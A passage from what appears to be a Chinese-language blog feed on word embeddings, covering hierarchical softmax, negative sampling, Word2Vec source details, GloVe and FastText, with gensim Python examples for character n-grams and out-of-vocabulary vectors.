的正向传播</h3><ul>  <li>    <p>层 Softmax 实际上是把一个超大的多分类问题转化成一系列二分类问题</p>  </li>  <li>    <p>示例：求 <code>P(&quot;足球&quot;|context(&quot;足球&quot;))</code></p>    <div align="center"><img src="http://www.meng.uno/images/assets/TIM截图20180806144052.png" height="400"></div>    <ul>      <li>        <p>从根节点到“足球”所在的叶子节点，需要经过 4 个分支，每次分支相当于一次<strong>二分类</strong>（逻辑斯蒂回归，二元Softmax）</p>        <div align="center"><img src="http://www.meng.uno/images/assets/公式_20180806150816.png" height=""></div>        <blockquote>          <p>这里遵从原文，将 0 作为正类，1 作为负类</p>        </blockquote>      </li>      <li>        <p>而 <code>P(&quot;足球&quot;|context(&quot;足球&quot;))</code> 就是每次分类正确的概率之积，即</p>        <div align="center"><img src="http://www.meng.uno/images/assets/公式_20180806150727.png" height=""></div>        <blockquote>          <p>这里每个非叶子都对应一个参数 <code>θ_i</code></p>        </blockquote>      </li>    </ul>  </li></ul><h4 id="为什么层次-softmax-能加速">为什么层次 SoftMax 能加速</h4><ul>  <li>Softmax 大部分的计算量在于分母部分，它需要求出所有分量的和</li>  <li>而层次 SoftMax 每次只需要计算两个分量，因此极大的提升了速度</li></ul><h3 id="层次-softmax-的反向传播-todo">层次 Softmax 的反向传播 TODO</h3><blockquote>  <p><a href="https://blog.csdn.net/itplus/article/details/37969979" target="_blank" rel="noopener">word2vec 中的数学原理详解（四）基于 Hierarchical Softmax 的模型</a> - CSDN博客</p></blockquote><h2 id="基于层次-softmax-的-skip-gram-模型">基于层次 Softmax 的 Skip-gram 模型</h2><ul>  <li>    <p>这里保留了【投影层】，但实际上只是一个恒等变换</p>    <div align="center"><img src="http://www.meng.uno/images/assets/TIM截图20180806151406.png" height="400"></div>  </li>  <li>    <p>从模型的角度看：CBOW 与 SG 模型的区别仅在于 <code>x_w</code> 的构造方式不同，前者是 <code>context(w)</code> 的词向量累加；后者就是 <code>w</code> 的词向量</p>  </li>  <li>    <p>虽然 SG 模型用中心词做特征，上下文词做类标，但实际上两者的地位是等价的</p>  </li></ul><h2 id="基于负采样的-cbow-和-skip-gram">基于负采样的 CBOW 和 Skip-gram</h2><ul>  <li>层次 Softmax 还不够简单，于是提出了基于负采样的方法进一步提升性能</li>  <li>负采样（Negative Sampling）是 NCE(Noise Contrastive Estimation) 的简化版本 &gt; <a href="https://blog.csdn.net/littlely_ll/article/details/79252064" target="_blank" rel="noopener">噪音对比估计（NCE）</a> - CSDN博客</li>  <li>CBOW 的训练样本是一个 <code>(context(w), w)</code> 二元对；对于给定的 <code>context(w)</code>，<code>w</code> 就是它的正样本，而其他所有词都是负样本。</li>  <li>如果不使用<strong>负采样</strong>，即 N-gram 神经语言模型中的做法，就是对整个词表 Softmax 和交叉熵</li>  <li>负采样相当于选取所有负例中的一部分作为负样本，从而减少计算量</li>  <li>Skip-gram 模型同理</li></ul><h2 id="负采样算法">负采样算法</h2><ul>  <li>负采样算法，即对给定的 <code>w</code> ，生成相应负样本的方法</li>  <li>最简单的方法是随机采样，但这会产生一点问题，词表中的词出现频率并不相同    <ul>      <li>如果不是从词表中采样，而是从语料中采样；显然，那些高频词被选为负样本的概率要大于低频词</li>      <li>在词表中采样时也应该遵循这个</li>    </ul>  </li>  <li>因此，负采样算法实际上就是一个<strong>带权采样</strong>过程    <div align="center"><img src="http://www.meng.uno/images/assets/TIM截图20180806161221.png" height="200"></div>  </li></ul><h3 id="word2vec-中的做法">Word2Vec 中的做法</h3><ul>  <li>    <p>记</p>    <div align="center"><img src="http://www.meng.uno/images/assets/公式_20180806165417.png" height=""></div>  </li>  <li>    <p>以这 <code>N+1</code> 个点对区间 <code>[0,1]</code> 做非等距切分</p>  </li>  <li>    <p>引入的一个在区间 <code>[0,1]</code> 上的 <code>M</code> 等距切分，其中 <code>M &gt;&gt; N</code></p>    <div align="center"><img src="http://www.meng.uno/images/assets/TIM截图20180806165750.png" height=""></div>    <blockquote>      <p>源码中取 <code>M = 10^8</code></p>    </blockquote>  </li>  <li>    <p>然后对两个切分做投影，得到映射关系</p>    <div align="center"><img src="http://www.meng.uno/images/assets/公式_20180806170618.png" height=""></div>  </li>  <li>    <p>采样时，每次生成一个 <code>[1, M-1]</code> 之间的整数 <code>i</code>，则 <code>Table(i)</code> 就对应一个样本；<br> 当采样到正例时，跳过    </p>  </li>  <li>    <p>特别的，Word2Vec 在计算 <code>len(w)</code> 时做了一些改动——为 <code>count(·)</code> 加了一个<strong>指数</strong></p>    <div align="center"><img src="http://www.meng.uno/images/assets/公式_20180806162119.png" height=""></div>  </li></ul><h2 id="一些源码细节">一些源码细节</h2><h3 id="σ-x-的近似计算"><code>σ(x)</code> 的近似计算</h3><ul>  <li>    <p>类似带权采样的策略，用<strong>查表</strong>来代替计算</p>    <div align="center"><img src="http://www.meng.uno/images/assets/TIM截图20180806172158.png" height=""></div>  </li>  <li>    <p>具体计算公式如下</p>    <div align="center"><img src="http://www.meng.uno/images/assets/公式_20180806173111.png" height=""></div>    <blockquote>      <p>因为 <code>σ(x)</code> 函数的饱和性，当 <code>x &lt; -6 || x &gt; 6</code> 时，函数值基本不变了</p>    </blockquote>  </li></ul><h3 id="低频词的处理">低频词的处理</h3><ul>  <li>对于低频词，会设置阈值（默认 5），对于出现频次低于该阈值的词会直接舍弃，同时训练集中也会被删除</li></ul><h3 id="高频词的处理">高频词的处理</h3><ul>  <li>高频词提供的信息相对较少，为了提高低频词的词向量质量，有必要对高频词进行限制</li>  <li>高频词对应的词向量在训练时，不会发生明显的变化，因此在训练是可以减少对这些词的训练，从而提升速度</li></ul><p><strong>Sub-sampling 技巧</strong></p><ul>  <li>源码中使用 Sub-sampling 技巧来解决高频词的问题，能带来 2~10 倍的训练速度提升，同时提高低频词的词向量精度</li>  <li>给定一个词频阈值 <code>t</code>，将 <code>w</code> 以 <code>p(w)</code> 的概率舍弃，<code>p(w)</code> 的计算如下    <div align="center"><img src="http://www.meng.uno/images/assets/公式_20180806175337.png" height=""></div>  </li></ul><p><strong>Word2Vec 中的Sub-sampling</strong></p><ul>  <li>显然，Sub-Sampling 只会针对 出现频次大于 <code>t</code> 的词</li>  <li>特别的，Word2Vec 使用如下公式计算 <code>p(w)</code>，效果是类似的    <div align="center"><img src="http://www.meng.uno/images/assets/公式_20180806193111.png" height=""></div>  </li></ul><h3 id="自适应学习率">自适应学习率</h3><ul>  <li>    <p>预先设置一个初始的学习率 <code>η_0</code>（默认 0.025），每处理完 <code>M</code>（默认 10000）个词，就根据以下公式调整学习率</p>    <div align="center"><img src="http://www.meng.uno/images/assets/公式_20180806200601.png" height=""></div>  </li>  <li>    <p>随着训练的进行，学习率会主键减小，并趋向于 0</p>  </li>  <li>    <p>为了方式学习率过小，Word2Vec 设置了一个阈值 <code>η_min</code>（默认 <code>0.0001 * η_0</code>）；当学习率小于 <code>η_min</code>，则固定为 <code>η_min</code>。</p>  </li></ul><h3 id="参数初始化">参数初始化</h3><ul>  <li>词向量服从均匀分布 <code>[-0.5/m, 0.5/m]</code>，其中 <code>m</code> 为词向量的维度</li>  <li>所有网络参数初始化为 <code>0</code></li></ul><h1>GloVe</h1><h2 id="共现矩阵">共现矩阵</h2><ul>  <li>共现矩阵的实现方式    <ul>      <li>        <p>基于文档 - LSA 模型（SVD分解）</p>      </li>      <li>        <p>基于窗口 - 类似 skip-gram 模型中的方法</p>        <div align="center"><img src="http://www.meng.uno/images/assets/共现矩阵.png" height="300"></div>        <blockquote>          <p><code>skip_window = 1</code> 的共现矩阵</p>        </blockquote>      </li>    </ul>  </li></ul><h3 id="构架共现矩阵的细节">构架共现矩阵的细节</h3><ul>  <li><strong>功能词的处理</strong>    <ul>      <li>功能词：如 “the”, “he”, “has”, …</li>      <li><strong>法1</strong>）直接忽略        <ul>          <li>在一些分类问题上可以这么做；如果目标是词向量，则不建议使用这种方法</li>        </ul>      </li>      <li><strong>法2</strong>）设置阈值 <code>min(x, t)</code>        <ul>          <li>其中 <code>x</code> 为功能词语其他词的共现次数，<code>t</code> 为设置的阈值</li>        </ul>      </li>    </ul>  </li>  <li>可以尝试使用一些方法代替单纯的计数，如<strong>皮尔逊相关系数</strong>，负数记为 0    <blockquote>      <p>但是似乎没有人这么做</p>    </blockquote>  </li></ul><h2 id="glove-的基本思想">GloVe 的基本思想</h2><ul>  <li>    <p>GloVe 模型的是基于<strong>共现矩阵</strong>构建的</p>  </li>  <li>    <p>GloVe 认为共现矩阵可以通过一些统计信息得到词之间的关系，这些关系可以一定程度上表达词的含义</p>    <div align="center"><img src="http://www.meng.uno/images/assets/TIM截图20180807144435.png" height=""></div>    <ul>      <li><strong>solid</strong> related to <strong>ice</strong> but not <strong>steam</strong></li>      <li><strong>gas</strong> related to <strong>stream</strong> but not <strong>ice</strong></li>      <li><strong>water</strong> related to both</li>      <li><strong>fashion</strong> relate not to both</li>    </ul>    <blockquote>      <p>说明 TODO</p>    </blockquote>  </li>  <li>    <p>GloVe 的基本思想：</p>    <ul>      <li>假设词向量已知，如果这些词向量通过<strong>某个函数</strong>（目标函数）可以<strong>拟合</strong>共现矩阵中的统计信息，那么可以认为这些词向量也拥有了共现矩阵中蕴含的语义</li>      <li>模型的训练过程就是拟合词向量的过程</li>    </ul>  </li></ul><h2 id="glove-的目标函数">GloVe 的目标函数</h2><div align="center"><img src="http://www.meng.uno/images/assets/公式_20180807150747.png" height=""></div><p>其中</p><ul>  <li>    <p><code>w_i</code> 和 <code>w_j</code> 为词向量</p>  </li>  <li>    <p><code>x_ij</code> 为 <code>w_i</code> 和 <code>w_j</code> 的共现次数</p>  </li>  <li>    <p><code>f(x)</code> 是一个权重函数，为了限制高频词和防止 <code>x_ij = 0</code></p>    <div align="center"><img src="http://www.meng.uno/images/assets/TIM截图20180807151212.png" height=""></div>    <ul>      <li>当 <code>x_ij = 0</code> 时，有        <div align="center"><img src="http://www.meng.uno/images/assets/公式_20180807151738.png" height=""></div>      </li>    </ul>  </li></ul><h3 id="glove-目标函数的推导过程">GloVe 目标函数的推导过程</h3><blockquote>  <p>以前整理在 OneNote 上的，有时间在整理</p></blockquote><ul>  <li>    <p>目标函数</p>    <div align="center"><img src="http://www.meng.uno/images/assets/TIM截图20180807152158.png" height=""></div>    <div align="center"><img src="http://www.meng.uno/images/assets/TIM截图20180807152241.png" height=""></div>    <div align="center"><img src="http://www.meng.uno/images/assets/TIM截图20180807152306.png" height=""></div>    <div align="center"><img src="http://www.meng.uno/images/assets/TIM截图20180807152431.png" height=""></div>    <div align="center"><img src="http://www.meng.uno/images/assets/TIM截图20180807152459.png" height=""></div>  </li>  <li>    <p><code>w_i</code> 的权重函数</p>    <div align="center"><img src="http://www.meng.uno/images/assets/TIM截图20180807152530.png" height=""></div>  </li></ul><h2 id="glove-与-word2vec-的区别">GloVe 与 Word2Vec 的区别</h2><ul>  <li>    <p>Word2Vec 本质上是一个神经网络；<br> Glove 也利用了<strong>反向传播</strong>来更新词向量，但是结构要更简单，所以 GloVe 的速度更快</p>  </li>  <li>    <p>Glove 认为 Word2Vec 对高频词的处理还不够，导致速度慢；GloVe 认为共现矩阵可以解决这个问题</p>    <blockquote>      <p>实际 Word2Vec 已结有了一些对高频词的措施</p>    </blockquote>    <ul>      <li>从效果上看，虽然 GloVe 的训练速度更快，但是<strong>词向量的性能</strong>在通用性上要弱一些：<br> 在一些任务上表现优于 Word2Vec，但是在更多的任务上要比 Word2Vec 差</li>    </ul>  </li></ul><h1>FastText</h1><ul>  <li>    <p>FastText 是从 Word2Vec 的 CBOW 模型演化而来的；<br> 从网络的角度来看，两者的模型基本一致；区别仅在于两者的分类目标不同；      <br> 具体来说，FastText 的分类目标是文档的标签，CBOW 则是中心词的标签</p>    <div align="center"><img src="http://www.meng.uno/images/assets/TIM截图20180807094759.png" height=""></div>  </li>  <li>    <p>FastText 与 CBOW 的相同点：</p>    <ul>      <li>包含三层：输入层、隐含层、输出层（Hierarchical Softmax）</li>      <li>输入都是多个单词的词向量</li>      <li>隐藏层（投影层）都是对多个词向量的叠加平均</li>      <li>输出都是一个特定的 target</li>      <li>从网络的角度看，两者基本一致</li>    </ul>  </li>  <li>    <p>不同点：</p>    <ul>      <li>CBOW 的输入是中心词两侧<code>skip_window</code>内的上下文词；FastText 除了上下文词外，还包括这些词的字符级 <strong>N-gram 特征</strong></li>      <li>CBOW 的输出是中心词的类标，fastText 的输出是句子对应的类标</li>    </ul>  </li>  <li>    <p><strong>注意</strong>，字符级 N-gram 只限制在单个词内，以英文为例</p>    <figure class="highlight cpp">      <table>        <tr>          <td class="gutter">            <pre><span class="line">1</span><br><span class="line">2</span><br></pre>          </td>          <td class="code">            <pre><span class="line"><span class="comment">// 源码中计算 n-grams 的声明，只计算单个词的字符级 n-gram</span></span><br><span class="line">compute_ngrams(word, <span class="keyword">unsigned</span> <span class="keyword">int</span> min_n, <span class="keyword">unsigned</span> <span class="keyword">int</span> max_n);</span><br></pre>          </td>        </tr>      </table>    </figure>    <figure class="highlight python">      <table>        <tr>          <td class="gutter">            <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre>          </td>          <td class="code">            <pre><span class="line"><span class="comment"># &gt; https://github.com/vrasneur/pyfasttext#get-the-subwords</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>model.args.get(<span class="string">'minn'</span>), model.args.get(<span class="string">'maxn'</span>)</span><br><span class="line">(<span class="number">2</span>, <span class="number">4</span>)</span><br><span class="line"><span class="comment"># 调用源码的 Python 接口，源码上也会添加 '&lt;' 和 '&gt;'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>model.get_all_subwords(<span class="string">'hello'</span>) <span class="comment"># word + subwords from 2 to 4 characters</span></span><br><span class="line">[<span class="string">'hello'</span>, <span class="string">'&lt;h'</span>, <span class="string">'&lt;he'</span>, <span class="string">'&lt;hel'</span>, <span class="string">'he'</span>, <span class="string">'hel'</span>, <span class="string">'hell'</span>, <span class="string">'el'</span>, <span class="string">'ell'</span>, <span class="string">'ello'</span>, <span class="string">'ll'</span>, <span class="string">'llo'</span>, <span class="string">'llo&gt;'</span>, <span class="string">'lo'</span>, <span class="string">'lo&gt;'</span>, <span class="string">'o&gt;'</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="comment"># model.get_all_subwords('hello world')  # warning</span></span><br></pre>          </td>        </tr>      </table>    </figure>  </li>  <li>    <p><strong>值得一提的是</strong>，因为 FastText 使用了字符级的 N-gram 向量作为额外的特征，使其能够对<strong>未登录词</strong>也能输出相应的词向量；<br></p>    <p><strong>具体来说</strong>，<strong>未登录词</strong>的词向量等于其 N-gram 向量的叠加</p>  </li></ul><h2 id="gensim-models-fasttext-使用示例"><code>gensim.models.FastText</code> 使用示例</h2><ul>  <li>    <p>构建 FastText 以及获取词向量</p>    <figure class="highlight python">      <table>        <tr>          <td class="gutter">            <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre>          </td>          <td class="code">            <pre><span class="line"><span class="comment"># gensim 示例</span></span><br><span class="line"><span class="keyword">import</span> gensim</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> gensim.test.utils <span class="keyword">import</span> common_texts</span><br><span class="line"><span class="keyword">from</span> gensim.models.keyedvectors <span class="keyword">import</span> FastTextKeyedVectors</span><br><span class="line"><span class="keyword">from</span> gensim.models._utils_any2vec <span class="keyword">import</span> compute_ngrams, ft_hash</span><br><span class="line"><span class="keyword">from</span> gensim.models <span class="keyword">import</span> FastText</span><br><span class="line"><span class="comment"># 构建 FastText 模型</span></span><br><span class="line">sentences = [[<span class="string">"Hello"</span>, <span class="string">"World"</span>, <span class="string">"!"</span>], [<span class="string">"I"</span>, <span class="string">"am"</span>, <span class="string">"huay"</span>, <span class="string">"."</span>]]</span><br><span class="line">min_ngrams, max_ngrams = <span class="number">2</span>, <span class="number">4</span>  <span class="comment"># ngrams 范围</span></span><br><span class="line">model = FastText(sentences, size=<span class="number">5</span>, min_count=<span class="number">1</span>, min_n=min_ngrams, max_n=max_ngrams)</span><br><span class="line"><span class="comment"># 可以通过相同的方式获取每个单词以及任一个 n-gram 的向量</span></span><br><span class="line">print(model.wv[<span class="string">'hello'</span>])</span><br><span class="line">print(model.wv[<span class="string">'&lt;h'</span>])</span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">[-0.03481839  0.00606661  0.02581969  0.00188777  0.0325358 ]</span></span><br><span class="line"><span class="string">[ 0.04481247 -0.1784363  -0.03192253  0.07162753  0.16744071]</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line">print()</span><br><span class="line"><span class="comment"># 词向量和 n-gram 向量是分开存储的</span></span><br><span class="line">print(len(model.wv.vectors))  <span class="comment"># 7</span></span><br><span class="line">print(len(model.wv.vectors_ngrams))  <span class="comment"># 57</span></span><br><span class="line"><span class="comment"># gensim 好像没有提供直接获取所有 ngrams tokens 的方法</span></span><br><span class="line">print(model.wv.vocab.keys())</span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">['Hello', 'World', '!', 'I', 'am', 'huay', '.']</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line">print()</span><br></pre>          </td>        </tr>      </table>    </figure>  </li></ul><h3 id="获取单个词的-ngrams-表示">获取单个词的 ngrams 表示</h3><ul>  <li>    <p>利用源码中 <code>compute_ngrams</code> 方法，gensim 提供了该方法的 Python 接口</p>    <figure class="highlight python">      <table>        <tr>          <td class="gutter">            <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre>          </td>          <td class="code">            <pre><span class="line">sum_ngrams = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> s <span class="keyword">in</span> sentences:</span><br><span class="line">    <span class="keyword">for</span> w <span class="keyword">in</span> s:</span><br><span class="line">        w = w.lower()</span><br><span class="line">        <span class="comment"># from gensim.models._utils_any2vec import compute_ngrams</span></span><br><span class="line">        ret = compute_ngrams(w, min_ngrams, max_ngrams)  </span><br><span class="line">        print(ret)</span><br><span class="line">        sum_ngrams += len(ret)</span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">['&lt;h', 'he', 'el', 'll', 'lo', 'o&gt;', '&lt;he', 'hel', 'ell', 'llo', 'lo&gt;', '&lt;hel', 'hell', 'ello', 'llo&gt;']</span></span><br><span class="line"><span class="string">['&lt;w', 'wo', 'or', 'rl', 'ld', 'd&gt;', '&lt;wo', 'wor', 'orl', 'rld', 'ld&gt;', '&lt;wor', 'worl', 'orld', 'rld&gt;']</span></span><br><span class="line"><span class="string">['&lt;!', '!&gt;', '&lt;!&gt;']</span></span><br><span class="line"><span class="string">['&lt;i', 'i&gt;', '&lt;i&gt;']</span></span><br><span class="line"><span class="string">['&lt;a', 'am', 'm&gt;', '&lt;am', 'am&gt;', '&lt;am&gt;']</span></span><br><span class="line"><span class="string">['&lt;h', 'hu', 'ua', 'ay', 'y&gt;', '&lt;hu', 'hua', 'uay', 'ay&gt;', '&lt;hua', 'huay', 'uay&gt;']</span></span><br><span class="line"><span class="string">['&lt;.', '.&gt;', '&lt;.&gt;']</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="keyword">assert</span> sum_ngrams == len(model.wv.vectors_ngrams)</span><br><span class="line">print(sum_ngrams)  <span class="comment"># 57</span></span><br><span class="line">print()</span><br></pre>          </td>        </tr>      </table>    </figure>  </li></ul><h3 id="计算一个未登录词的词向量">计算一个未登录词的词向量</h3><ul>  <li>    <p>未登录词实际上是已知 n-grams 向量的叠加平均</p>    <figure class="highlight python">      <table>        <tr>          <td class="gutter">            <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre>          </td>          <td class="code">            <pre><span class="line"><span class="comment"># 因为 "a", "aa", "aaa" 中都只含有 "&lt;a" ，所以它们实际上都是 "&lt;a"</span></span><br><span class="line">print(model.wv[<span class="string">"a"</span>])</span><br><span class="line">print(model.wv[<span class="string">"aa"</span>])</span><br><span class="line">print(model.wv[<span class="string">"aaa"</span>])</span><br><span class="line">print(model.wv[<span class="string">"&lt;a"</span>])  </span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">[ 0.00226487 -0.19139008  0.17918809  0.13084619 -0.1939924 ]</span></span><br><span class="line"><span class="string">[ 0.00226487 -0.19139008  0.17918809  0.13084619 -0.1939924 ]</span></span><br><span class="line"><span class="string">[ 0.00226487 -0.19139008  0.17918809  0.13084619 -0.1939924 ]</span></span><br><span class="line"><span class="string">[ 0.00226487 -0.19139008  0.17918809  0.13084619 -0.1939924 ]</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line">print()</span><br></pre>          </td>        </tr>      </table>    </figure>  </li></ul><ul>  <li>    <p>只要未登录词能被已知的 n-grams 组合，就能得到该词的词向量</p>    <blockquote>      <p><code>gensim.models.keyedvectors.FastTextKeyedVectors.word_vec(token)</code> 的内部实现</p>    </blockquote>    <figure class="highlight python">      <table>        <tr>          <td class="gutter">            <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre>          </td>          <td class="code">            <pre><span class="line">word_unk = <span class="string">"aam"</span></span><br><span class="line">ngrams = compute_ngrams(word_unk, min_ngrams, max_ngrams)  <span class="comment"># min_ngrams, max_ngrams = 2, 4</span></span><br><span class="line">word_vec = np.zeros(model.vector_size, dtype=np.float32)</span><br><span class="line">ngrams_found = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> ngram <span class="keyword">in</span> ngrams:</span><br><span class="line">    ngram_hash = ft_hash(ngram) % model.bucket</span><br><span class="line">    <span class="keyword">if</span> ngram_hash <span class="keyword">in</span> model.wv.hash2index:</span><br><span class="line">        word_vec += model.wv.vectors_ngrams[model.wv.hash2index[ngram_hash]]</span><br><span class="line">        ngrams_found += <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> word_vec.any():  <span class="comment">#</span></span><br><span class="line">    word_vec = word_vec / max(<span class="number">1</span>, ngrams_found)</span><br><span class="line"><span class="keyword">else</span>:  <span class="comment"># 如果一个 ngram 都没找到，gensim 会报错；个人认为把 0 向量传出来也可以</span></span><br><span class="line">    <span class="keyword">raise</span> KeyError(<span class="string">'all ngrams for word %s absent from model'</span> % word_unk)</span><br><span class="line">print(word_vec)</span><br><span class="line">print(model.wv[<span class="string">"aam"</span>])</span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">[ 0.02210762 -0.10488641  0.05512805  0.09150169  0.00725085]</span></span><br><span class="line"><span class="string">[ 0.02210762 -0.10488641  0.05512805  0.09150169  0.00725085]</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="comment"># 如果一个 ngram 都没找到，gensim 会报错</span></span><br><span class="line"><span class="comment">#   其实可以返回一个 0 向量的，它内部实际上是从一个 0 向量开始累加的；</span></span><br><span class="line"><span class="comment">#   但返回时做了一个判断——如果依然是 0 向量，则报错</span></span><br><span class="line"><span class="comment"># print(model.wv['z'])</span></span><br><span class="line"><span class="string">r"""</span></span><br><span class="line"><span class="string">Traceback (most recent call last):</span></span><br><span class="line"><span class="string">  File "D:/gensim/FastText.py", line 53, in &lt;module&gt;</span></span><br><span class="line"><span class="string">    print(model.wv['z'])</span></span><br><span class="line"><span class="string">  File "D:\program\work\Python\Anaconda3\envs\tf\lib\site-packages\gensim\models\keyedvectors.py", line 336, in __getitem__</span></span><br><span class="line"><span class="string">    return self.get_vector(entities)</span></span><br><span class="line"><span class="string">  File "D:\program\work\Python\Anaconda3\envs\tf\lib\site-packages\gensim\models\keyedvectors.py", line 454, in get_vector</span></span><br><span class="line"><span class="string">    return self.word_vec(word)</span></span><br><span class="line"><span class="string">  File "D:\program\work\Python\Anaconda3\envs\tf\lib\site-packages\gensim\models\keyedvectors.py", line 1989, in word_vec</span></span><br><span class="line"><span class="string">    raise KeyError('all ngrams for word %s absent from model' % word)</span></span><br><span class="line"><span class="string">KeyError: 'all ngrams for word z absent from model'</span></span><br><span class="line"><span class="string">"""</span></span><br></pre>          </td>        </tr>      </table>    </figure>  </li></ul><h1>CharCNN 字向量</h1><ul>  <li>CharCNN 的思想是通过字符向量得到词向量</li></ul><blockquote>  <p>[1509] <a href="https://arxiv.org/abs/1509.01626" target="_blank" rel="noopener">Character-level Convolutional Networks for Text Classification</a></p></blockquote><h1>其他实践</h1><h2 id="一般-embedding-维度的选择">一般 embedding 维度的选择</h2><blockquote>  <p><a href="https://www.tensorflow.org/versions/master/guide/feature_columns#indicator_and_embedding_columns" target="_blank" rel="noopener">Feature Columns</a>  |  TensorFlow</p></blockquote><ul>  <li>    <p>经验公式 <code>embedding_size = n_categories ** 0.25</code></p>  </li>  <li>    <p>在大型语料上训练的词向量维度通常会设置的更大一些，比如 <code>100~300</code></p>    <blockquote>      <p>如果根据经验公式，是不需要这么大的，比如 200W 词表的词向量维度只需要 <code>200W ** 0.25 ≈ 37</code></p>    </blockquote>  </li></ul><p><br><br>本文链接： <a href="http://home.meng.uno/articles/5a3aed16/">http://home.meng.uno/articles/5a3aed16/</a> 欢迎转载！</p>]]></content>
    
    <summary type="html">
    
      背景知识
什么是词向量/词嵌入
 * 词向量（word embedding）是一个固定长度的实值向量
 * 词向量是神经语言模型的副产品。
 * 词向量是针对“词”提出的。事实上，也可以针对更细或更粗的粒度来进行推广——比如字向量、句向量、文档向量等

词向量的理解 TODO
word2vec 中的数学原理详解（三）背景知识 - CSDN博客

 * 在 NLP 任务中，因为机器无法直接理解自然语言，所以首先要做的事情就是将语言数学化——词向量就是一种数学化的方式。

分布式表示 (distributed representation)

 * 分布式假设
 * TODO
 * 常见的分布式表
    
    </summary>
    
      <category term="Natural Language Processing" scheme="http://home.meng.uno/categories/Natural-Language-Processing/"/>
    
    
      <category term="NLP" scheme="http://home.meng.uno/tags/NLP/"/>
    
      <category term="词向量" scheme="http://home.meng.uno/tags/%E8%AF%8D%E5%90%91%E9%87%8F/"/>
    
      <category term="自然语言处理" scheme="http://home.meng.uno/tags/%E8%87%AA%E7%84%B6%E8%AF%AD%E8%A8%80%E5%A4%84%E7%90%86/"/>
    
  </entry>
  
  <entry>
    <title>静态链接</title>
    <link href="http://home.meng.uno/articles/41311c08/"/>
    <id>http://home.meng.uno/articles/41311c08/</id>
    <published>2017-06-11T04:14:23.000Z</published>
    <updated>2020-12-02T02:05:11.000Z</updated>
    
